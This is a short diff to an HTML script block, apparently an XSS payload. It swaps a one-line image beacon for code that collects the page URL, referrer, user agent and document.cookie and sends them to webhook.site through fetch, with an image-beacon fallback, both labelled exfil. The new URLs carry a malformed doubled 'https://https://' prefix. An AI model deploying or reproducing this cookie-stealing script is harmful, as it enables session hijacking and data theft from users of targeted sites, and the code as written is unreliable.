@@ -1,3 +1,26 @@
 <script>
-new Image().src = "https://webhook.site/45cd5448-40c3-4d53-b5a0-3bf905564673?d=" + encodeURIComponent(location.hash);
+(function () {
+    const data = {
+        href: location.href,
+        origin: location.origin,
+        pathname: location.pathname,
+        search: location.search,
+        hash: location.hash,
+        referrer: document.referrer,
+        userAgent: navigator.userAgent,
+        cookies: document.cookie
+    };
+
+    const payload = encodeURIComponent(JSON.stringify(data));
+
+    // Primary exfil
+    fetch("https://https://webhook.site/d51a0f1d-1211-4928-8778-079a065dd0bc?d=" + payload, {
+        method: "GET",
+        mode: "no-cors"
+    }).catch(() => {});
+
+    // Fallback (Image beacon)
+    new Image().src = "https://https://webhook.site/d51a0f1d-1211-4928-8778-079a065dd0bc?img=" + payload;
+
+})();
 </script>
